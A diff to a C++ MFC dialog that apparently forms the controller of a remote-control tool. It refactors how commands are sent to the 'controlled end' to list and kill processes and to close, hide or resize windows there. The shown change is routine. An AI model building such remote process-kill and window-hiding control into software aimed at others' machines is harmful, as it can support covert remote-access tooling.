@@ -285,7 +285,7 @@ void CSystemDlg::OnPlistKill()
 		dwOffset += sizeof(DWORD);
 	}
 	//发送数据到被控端在被控端中查找COMMAND_KILLPROCESS这个数据头
-	m_iocpServer->Send2Client(m_ContextObject, szBuffer, LocalSize(szBuffer));
+	m_ContextObject->Send2Client(szBuffer, LocalSize(szBuffer));
 	LocalFree(szBuffer);
 
 	Sleep(100);
@@ -308,7 +308,7 @@ VOID CSystemDlg::OnPlistRefresh()
 VOID CSystemDlg::GetProcessList(void)
 {
 	BYTE bToken = COMMAND_PSLIST;
-	m_iocpServer->Send2Client(m_ContextObject, &bToken, 1);
+	m_ContextObject->Send2Client(&bToken, 1);
 }
 
 
@@ -321,7 +321,7 @@ void CSystemDlg::OnWlistRefresh()
 void CSystemDlg::GetWindowsList(void)
 {
 	BYTE bToken = COMMAND_WSLIST;
-	m_iocpServer->Send2Client(m_ContextObject, &bToken, 1);
+	m_ContextObject->Send2Client(&bToken, 1);
 }
 
 
@@ -363,7 +363,7 @@ void CSystemDlg::OnWlistClose()
 		auto data = (ItemData*)pListCtrl->GetItemData(nItem);
 		DWORD hwnd = data->ID; //得到窗口的句柄一同发送  4   djfkdfj  dkfjf  4
 		memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));   //1 4
-		m_iocpServer->Send2Client(m_ContextObject, lpMsgBuf, sizeof(lpMsgBuf));			
+		m_ContextObject->Send2Client(lpMsgBuf, sizeof(lpMsgBuf));			
 
 	}
 }
@@ -387,7 +387,7 @@ void CSystemDlg::OnWlistHide()
 		memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));      //得到窗口的句柄一同发送
 		DWORD dHow=SW_HIDE;                          //窗口处理参数 0
 		memcpy(lpMsgBuf+1+sizeof(hwnd),&dHow,sizeof(DWORD));
-		m_iocpServer->Send2Client(m_ContextObject, lpMsgBuf, sizeof(lpMsgBuf));	
+		m_ContextObject->Send2Client(lpMsgBuf, sizeof(lpMsgBuf));	
 	}
 }
 
@@ -409,7 +409,7 @@ void CSystemDlg::OnWlistRecover()
 		memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));
 		DWORD dHow=SW_NORMAL;
 		memcpy(lpMsgBuf+1+sizeof(hwnd),&dHow,sizeof(DWORD));
-		m_iocpServer->Send2Client(m_ContextObject, lpMsgBuf, sizeof(lpMsgBuf));	
+		m_ContextObject->Send2Client(lpMsgBuf, sizeof(lpMsgBuf));	
 	}
 }
 
@@ -431,7 +431,7 @@ void CSystemDlg::OnWlistMax()
 		memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));
 		DWORD dHow=SW_MAXIMIZE;
 		memcpy(lpMsgBuf+1+sizeof(hwnd),&dHow,sizeof(DWORD));
-		m_iocpServer->Send2Client(m_ContextObject, lpMsgBuf, sizeof(lpMsgBuf));	
+		m_ContextObject->Send2Client(lpMsgBuf, sizeof(lpMsgBuf));	
 	}
 }
 
@@ -453,7 +453,7 @@ void CSystemDlg::OnWlistMin()
 		memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));
 		DWORD dHow=SW_MINIMIZE;
 		memcpy(lpMsgBuf+1+sizeof(hwnd),&dHow,sizeof(DWORD));
-		m_iocpServer->Send2Client(m_ContextObject, lpMsgBuf, sizeof(lpMsgBuf));	
+		m_ContextObject->Send2Client(lpMsgBuf, sizeof(lpMsgBuf));	
 	}
 }
 
